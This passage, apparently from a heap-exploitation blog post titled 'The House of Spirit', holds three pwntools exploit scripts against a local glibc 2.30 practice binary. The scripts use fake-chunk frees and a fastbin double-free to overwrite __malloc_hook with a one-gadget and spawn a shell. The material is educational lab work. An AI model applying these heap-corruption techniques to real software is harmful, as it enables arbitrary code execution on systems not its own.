93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 #!/usr/bin/env python3 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.binary = elf = ELF(\u0026#39;./house_of_spirit\u0026#39;, checksec=False) libc = ELF(\u0026#39;../.glibc/glibc_2.30_no-tcache/libc.so.6\u0026#39;, checksec=False) ld = ELF(\u0026#39;../.glibc/glibc_2.30_no-tcache/libc.so.6\u0026#39;, checksec=False) gs = \u0026#34;\u0026#34;\u0026#34; b *main b *main+270 b *main+327 b *main+415 b *main+541 b *main+652 b *main+707 b *main+792 b *main+873 \u0026#34;\u0026#34;\u0026#34; index = 0 def info(mes): return log.info(mes) def handle(): global puts global heap io.recvuntil(b\u0026#39;puts() @ \u0026#39;) puts = int(io.recvline(), 16) io.recvuntil(b\u0026#39;heap @ \u0026#39;) heap = int(io.recvline(), 16) info(\u0026#39;puts @ \u0026#39; + hex(puts)) info(\u0026#34;heap @ \u0026#34; + hex(heap)) return puts, heap def info_user(age, name): io.sendafter(b\u0026#39;Enter your age: \u0026#39;, str(age).encode()) io.sendafter(b\u0026#39;Enter your username: \u0026#39;, name) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def malloc(size, data, chunk_name): global index io.send(b\u0026#39;1\u0026#39;) io.sendafter(b\u0026#39;size: \u0026#39;, str(size).encode()) io.sendafter(b\u0026#39;data: \u0026#39;, data) io.sendafter(b\u0026#39;chunk name: \u0026#39;, chunk_name) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) index += 1 return index - 1 def free(index): io.send(b\u0026#39;2\u0026#39;) io.sendafter(b\u0026#39;index: \u0026#39;, str(index).encode()) #io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def target(): io.send(b\u0026#39;3\u0026#39;) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def quit(): io.send(b\u0026#39;4\u0026#39;) def start(): if args.GDB: return gdb.debug(elf.path, env={\u0026#34;LD_PRELOAD\u0026#34;: libc.path},gdbscript=gs) elif args.REMOTE: return remote(\u0026#39;\u0026#39;, ) else: return process(elf.path, env={\u0026#34;LD_PRELOAD\u0026#34;: libc.path}) io = start() puts, heap = handle() #===================================================================================== # fastbin chunk \u0026#39;\u0026#39;\u0026#39; age = 0x81 username = p64(0)*3 + p64(0x20fff) info_user(age, username) name = b\u0026#39;a\u0026#39;*8 + p64(elf.sym[\u0026#39;user\u0026#39;] + 0x10) chunk_A = malloc(0x18, b\u0026#39;X\u0026#39;*0x18, name) free(chunk_A) malloc(0x78, b\u0026#39;Y\u0026#39;*64 + b\u0026#39;Much Win\\x00\u0026#39;, \u0026#39;Winner\u0026#39;) target() \u0026#39;\u0026#39;\u0026#39; #===================================================================================== #largee chunk age = 0x91 #only trigger bit prev_inused for third chunk username = p64(0)*5 + p64(0x11) + p64(0) +p64(0x01) info_user(age, username) name = b\u0026#39;a\u0026#39;*8 + p64(elf.sym[\u0026#39;user\u0026#39;] + 0x10) chunk_A = malloc(0x18, b\u0026#39;X\u0026#39;*0x18, name) free(chunk_A) malloc(0x88, b\u0026#39;Y\u0026#39;*64 + b\u0026#39;Much Win\\x00\u0026#39;, \u0026#39;Winner\u0026#39;) target() quit() io.interactive() shell_with_heap_leak.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 #!/usr/bin/env python3 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.binary = elf = ELF(\u0026#39;./house_of_spirit\u0026#39;, checksec=False) libc = ELF(\u0026#39;../.glibc/glibc_2.30_no-tcache/libc.so.6\u0026#39;, checksec=False) gs = \u0026#34;\u0026#34;\u0026#34; b *main b *main+270 b *main+327 b *main+415 b *main+541 b *main+652 b *main+707 b *main+792 b *main+873 \u0026#34;\u0026#34;\u0026#34; index = 0 def info(mes): return log.info(mes) def handle(): global puts global heap io.recvuntil(b\u0026#39;puts() @ \u0026#39;) puts = int(io.recvline(), 16) io.recvuntil(b\u0026#39;heap @ \u0026#39;) heap = int(io.recvline(), 16) info(\u0026#39;puts @ \u0026#39; + hex(puts)) info(\u0026#34;heap @ \u0026#34; + hex(heap)) return puts, heap def info_user(age, name): io.sendafter(b\u0026#39;Enter your age: \u0026#39;, str(age).encode()) io.sendafter(b\u0026#39;Enter your username: \u0026#39;, name) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def malloc(size, data, chunk_name): global index io.send(b\u0026#39;1\u0026#39;) io.sendafter(b\u0026#39;size: \u0026#39;, str(size).encode()) io.sendafter(b\u0026#39;data: \u0026#39;, data) io.sendafter(b\u0026#39;chunk name: \u0026#39;, chunk_name) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) index += 1 return index - 1 def free(index): io.send(b\u0026#39;2\u0026#39;) io.sendafter(b\u0026#39;index: \u0026#39;, str(index).encode()) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def target(): io.send(b\u0026#39;3\u0026#39;) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def quit(): io.send(b\u0026#39;4\u0026#39;) def start(): if args.GDB: return gdb.debug(elf.path, env={\u0026#34;LD_PRELOAD\u0026#34;: libc.path},gdbscript=gs) elif args.REMOTE: return remote(\u0026#39;\u0026#39;, ) else: return process(elf.path) io = start() puts, heap = handle() libc.address = puts - libc.sym[\u0026#39;puts\u0026#39;] info(\u0026#34;libc base: \u0026#34; + hex(libc.address)) io.timeout = 0.1 #===================================================================================== # Ignore the \u0026#34;age\u0026#34; field. age = 0 # Ignore the \u0026#34;username\u0026#34; field. username = b\u0026#39;Broder\u0026#39; info_user(age, username) # Request two chunks with size 0x70. # The most-significant byte of the _IO_wide_data_0 vtable pointer (0x7f) is used later as a size field. # The \u0026#34;dup\u0026#34; chunk will be duplicated, the \u0026#34;safety\u0026#34; chunk is used to bypass the fastbins double-free mitigation. dup = malloc(0x68, b\u0026#39;A\u0026#39;*8, b\u0026#39;A\u0026#39;*8) safety = malloc(0x68, b\u0026#39;B\u0026#39;*8, b\u0026#39;B\u0026#39;*8) # Request a 3rd \u0026#34;spirit\u0026#34; chunk of any size, leverage the stack overflow to overwrite the pointer to this chunk # with the address of the \u0026#34;dup\u0026#34; chunk. spirit = malloc(0x18, b\u0026#39;C\u0026#39;*8, b\u0026#39;C\u0026#39;*8 + p64(heap + 0x10)) # Coerce a double-free by freeing the \u0026#34;dup\u0026#34; chunk, then the \u0026#34;safety\u0026#34; chunk, then the \u0026#34;spirit\u0026#34; chunk. # This way the \u0026#34;dup\u0026#34; chunk is not at the head of the 0x70 fastbin when it is freed for the second time, # bypassing the fastbins double-free mitigation. free(dup) free(safety) free(spirit) # The next request for a 0x70-sized chunk will be serviced by the \u0026#34;dup\u0026#34; chunk. # Request it, then overwrite its fastbin fd, pointing it to the fake chunk near the malloc hook, # specifically where the 0x7f byte of the _IO_wide_data_0 vtable pointer will form the # least-significant byte of the size field. malloc(0x68, p64(libc.sym[\u0026#39;__malloc_hook\u0026#39;] - 0x23), b\u0026#34;C\u0026#34;*8) # Make two more requests for 0x70-sized chunks. The \u0026#34;safety\u0026#34; chunk, then the \u0026#34;dup\u0026#34; chunk are allocated to # service these requests. malloc(0x68, b\u0026#39;D\u0026#39;*8, b\u0026#39;D\u0026#39;*8) malloc(0x68, b\u0026#39;E\u0026#39;*8, b\u0026#39;E\u0026#39;*8) # The next request for a 0x70-sized chunk is serviced by the fake chunk near the malloc hook. # Use it to overwrite the malloc hook with the address of a one-gadget. malloc(0x68, b\u0026#39;X\u0026#39;*0x13 + p64(libc.address + 0xe1fa1), b\u0026#34;F\u0026#34;*8) # [rsp+0x50] == NULL # The next call to malloc() will instead call the one-gadget and drop a shell. # The argument to malloc() is irrelevant, as long as it passes the program\u0026#39;s size check. malloc(1, b\u0026#34;\u0026#34;, b\u0026#34;\u0026#34;) # ============================================================================= io.interactive() shell_no_heap_leak.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 #!/usr/bin/env python3 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.binary = elf = ELF(\u0026#39;./house_of_spirit\u0026#39;, checksec=False) libc = ELF(\u0026#39;../.glibc/glibc_2.30_no-tcache/libc.so.6\u0026#39;, checksec=False) gs = \u0026#34;\u0026#34;\u0026#34; b *main b *main+270 b *main+327 b *main+415 b *main+541 b *main+652 b *main+707 b *main+792 b *main+873 \u0026#34;\u0026#34;\u0026#34; index = 0 def info(mes): return log.info(mes) def handle(): global puts global heap io.recvuntil(b\u0026#39;puts() @ \u0026#39;) puts = int(io.recvline(), 16) io.recvuntil(b\u0026#39;heap @ \u0026#39;) heap = int(io.recvline(), 16) info(\u0026#39;puts @ \u0026#39; + hex(puts)) info(\u0026#34;heap @ \u0026#34; + hex(heap)) return puts, heap def info_user(age, name): io.sendafter(b\u0026#39;Enter your age: \u0026#39;, str(age).encode()) io.sendafter(b\u0026#39;Enter your username: \u0026#39;, name) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def malloc(size, data, chunk_name): global index io.send(b\u0026#39;1\u0026#39;) io.sendafter(b\u0026#39;size: \u0026#39;, str(size).encode()) io.sendafter(b\u0026#39;data: \u0026#39;, data) io.sendafter(b\u0026#39;chunk name: \u0026#39;, chunk_name) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) index += 1 return index - 1 def free(index): io.send(b\u0026#39;2\u0026#39;) io.sendafter(b\u0026#39;index: \u0026#39;, str(index).encode()) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def target(): io.send(b\u0026#39;3\u0026#39;) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def quit(): io.send(b\u0026#39;4\u0026#39;) def start(): if args.GDB: return gdb.debug(elf.path, env={\u0026#34;LD_PRELOAD\u0026#34;: libc.path},gdbscript=gs) elif args.REMOTE: return remote(\u0026#39;\u0026#39;, ) else: return process(elf.path) io = start() puts, heap = handle() libc.address = puts - libc.sym[\u0026#39;puts\u0026#39;] info(\u0026#34;libc base: \u0026#34; + hex(libc.address)) io.timeout = 0.1 #===================================================================================== # Ignore the \u0026#34;age\u0026#34; field. age = 0x71 # Ignore the \u0026#34;username\u0026#34; field. username = p64(0) + p64(0x1234) info_user(age, username) # Request two chunks with any size (chunks A \u0026amp; C) and one chunk with size 0x70. # The most-significant byte of the _IO_wide_data_0 vtable pointer (0x7f) is used later as a size field. # Overflow pointers to chunk_A \u0026amp; chunk_C with the address of our fake chunk. # Chunk_B is used to bypass the fastbins double-free mitigation. chunk_A = malloc(0x18, b\u0026#34;A\u0026#34;*8, b\u0026#34;A\u0026#34;*8 + p64(elf.sym[\u0026#39;user\u0026#39;] + 0x10)) chunk_B = malloc(0x68, b\u0026#34;B\u0026#34;*8, b\u0026#34;B\u0026#34;*8) chunk_C = malloc(0x18, b\u0026#34;C\u0026#34;*8, b\u0026#34;C\u0026#34;*8 + p64(elf.sym[\u0026#39;user\u0026#39;] + 0x10)) # Coerce a double-free by freeing chunk_A, then chunk_B, then chunk_C. # This way the fake chunk is not at the head of the 0x70 fastbin when it is freed for the second time, # bypassing the fastbins double-free mitigation. free(chunk_A) # Frees the fake chunk. free(chunk_B) free(chunk_C) # Double-frees the fake chunk. # The next request for a 0x70-sized chunk will be serviced by the fake chunk. # Request it, then overwrite its fastbin fd, pointing it near the the malloc hook, # specifically where the 0x7f byte of the _IO_wide_data_0 vtable pointer will form the # least-significant byte of a size field. malloc(0x68, p64(libc.sym[\u0026#39;__malloc_hook\u0026#39;] - 0x23), b\u0026#34;D\u0026#34;*8) # Make two more requests for 0x70-sized chunks. The fake chunk, then chunk_B are allocated to # service these requests. malloc(0x68, b\u0026#34;E\u0026#34;*8, b\u0026#34;E\u0026#34;*8) malloc(0x68, b\u0026#34;F\u0026#34;*8, b\u0026#34;F\u0026#34;*8) # The next request for a 0x70-sized chunk is serviced by the fake chunk near the malloc hook. # Use it to overwrite the malloc hook with the address of a one-gadget. malloc(0x68, b\u0026#34;X\u0026#34;*0x13 + p64(libc.address + 0xe1fa1), b\u0026#34;G\u0026#34;*8) # [rsp+0x50] == NULL # The next call to malloc() will instead call the one-gadget and drop a shell. # The argument to malloc() is irrelevant, as long as it passes the program\u0026#39;s size check. malloc(1, b\u0026#34;\u0026#34;, b\u0026#34;\u0026#34;) # ============================================================================= io.interactive() ","date":"2024-06-15T00:00:00Z","image":"https://demo.stack.jimmycai.com/p/the-house-of-spirit/cover_hua4516f7622f942ea94cadaa72a82b7db_84930_120x120_fill_q75_box_smart1.jpg","permalink":"https://demo.stack.jimmycai.com/p/the-house-of-spirit/","title":"The House of Spirit"}]